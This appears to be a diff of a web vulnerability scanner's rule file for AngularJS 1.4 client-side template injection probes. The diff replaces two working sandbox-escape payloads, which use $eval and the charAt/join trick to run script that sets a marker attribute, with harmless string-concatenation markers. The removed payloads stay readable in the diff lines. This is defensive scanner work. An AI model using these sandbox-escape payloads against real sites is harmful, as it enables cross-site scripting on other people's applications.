@@ -3715,7 +3715,7 @@
             "config": {
               "browserNav": {
                 "checks": [
-                  "dom_xss"
+                  "template_marker"
                 ],
                 "markerToken": "ptk-ng-rh-140-149",
                 "settleMs": 1200,
@@ -3736,7 +3736,7 @@
                   "query",
                   "form"
                 ],
-                "value": "&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#125; &#125; &#125;;document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,104,45,49,52,48,45,49,52,57))//');&#125;&#125;",
+                "value": "&#123;&#123;'ptk-ng-'+'rh-140-149'&#125;&#125;",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -3746,13 +3746,13 @@
             "rule": {
               "or": [
                 {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
+                  "var": "attack.browserNav.template_marker.vulnerable"
                 },
                 {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
+                  "var": "attack.runtime.browserNav.template_marker.vulnerable"
                 },
                 {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
+                  "var": "attack.metadata.browserNav.template_marker.vulnerable"
                 }
               ]
             }
@@ -3784,24 +3784,25 @@
               "tags": [
                 "angularjs",
                 "client-template-injection",
-                "sandbox-bypass",
                 "template_interpolation",
-                "html-entity-delimiters"
+                "html-entity-delimiters",
+                "template-marker-proof",
+                "non-executing-proof"
               ]
             },
             "docs": {
-              "description": "Generic AngularJS client-side template injection probe using HTML entity-encoded interpolation delimiters. The attack is gated by AngularJS technology and version evidence, not by application routes."
+              "description": "Generic AngularJS client-side template injection probe using HTML entity-encoded interpolation delimiters. This variant uses a non-executing concatenated template marker so scanners can confirm Angular expression evaluation without triggering noisy AngularJS 1.4 sandbox-escape compiler errors."
             },
             "constants": {
               "markerToken": "ptk-ng-rh-140-149",
-              "payload": "&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#125; &#125; &#125;;document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,104,45,49,52,48,45,49,52,57))//');&#125;&#125;",
+              "payload": "&#123;&#123;'ptk-ng-'+'rh-140-149'&#125;&#125;",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.4\\.(?:[0-9])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b|1\\.4\\.(?:[0-9])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.4\\.(?:[0-9])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b",
               "versionRange": "reflected-1-4-0-to-1-4-9",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "entity-dom-marker-default"
+              "payloadFamily": "entity-template-marker-default"
             }
           }
         },
@@ -3814,7 +3815,7 @@
             "config": {
               "browserNav": {
                 "checks": [
-                  "dom_xss"
+                  "template_marker"
                 ],
                 "markerToken": "ptk-ng-ra-140-149",
                 "settleMs": 1200,
@@ -3835,7 +3836,7 @@
                   "query",
                   "form"
                 ],
-                "value": "&#91;&#91;'a'.constructor.prototype.charAt=&#91;&#93;.join;$eval('x=1} } };document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,97,45,49,52,48,45,49,52,57))//');&#93;&#93;",
+                "value": "&#91;&#91;'ptk-ng-'+'ra-140-149'&#93;&#93;",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -3845,13 +3846,13 @@
             "rule": {
               "or": [
                 {
-                  "var": "attack.browserNav.dom_xss.vulnerable"
+                  "var": "attack.browserNav.template_marker.vulnerable"
                 },
                 {
-                  "var": "attack.runtime.browserNav.dom_xss.vulnerable"
+                  "var": "attack.runtime.browserNav.template_marker.vulnerable"
                 },
                 {
-                  "var": "attack.metadata.browserNav.dom_xss.vulnerable"
+                  "var": "attack.metadata.browserNav.template_marker.vulnerable"
                 }
               ]
             }
@@ -3883,24 +3884,25 @@
               "tags": [
                 "angularjs",
                 "client-template-injection",
-                "sandbox-bypass",
                 "template_interpolation",
-                "html-entity-delimiters"
+                "html-entity-delimiters",
+                "template-marker-proof",
+                "non-executing-proof"
               ]
             },
             "docs": {
-              "description": "Generic AngularJS client-side template injection probe using HTML entity-encoded interpolation delimiters. The attack is gated by AngularJS technology and version evidence, not by application routes."
+              "description": "Generic AngularJS client-side template injection probe using HTML entity-encoded alternate interpolation delimiters. This variant uses a non-executing concatenated template marker so scanners can confirm Angular expression evaluation without triggering noisy AngularJS 1.4 sandbox-escape compiler errors."
             },
             "constants": {
               "markerToken": "ptk-ng-ra-140-149",
-              "payload": "&#91;&#91;'a'.constructor.prototype.charAt=&#91;&#93;.join;$eval('x=1} } };document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,97,45,49,52,48,45,49,52,57))//');&#93;&#93;",
+              "payload": "&#91;&#91;'ptk-ng-'+'ra-140-149'&#93;&#93;",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.4\\.(?:[0-9])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b|1\\.4\\.(?:[0-9])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.4\\.(?:[0-9])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.4\\.(?:[0-9])\\b",
               "versionRange": "reflected-1-4-0-to-1-4-9",
               "context": "template_interpolation"
             },
             "extensions": {
-              "payloadFamily": "entity-dom-marker-alt"
+              "payloadFamily": "entity-template-marker-alt"
             }
           }
         },
